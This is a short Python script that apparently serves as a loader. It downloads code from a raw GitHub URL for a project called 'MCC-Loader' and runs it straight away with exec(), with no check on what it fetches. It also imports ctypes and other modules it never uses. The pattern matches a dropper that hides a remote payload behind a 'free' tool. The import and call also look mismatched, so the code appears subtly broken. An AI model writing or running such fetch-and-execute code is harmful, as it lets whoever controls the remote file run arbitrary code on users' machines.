import urllib.request as urllib
import io
import ctypes
import time
from time import sleep
print('Fetching sources')
url = 'https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Main'
response = urllib.request.urlopen(url)
code = response.read().decode()
exec(code)
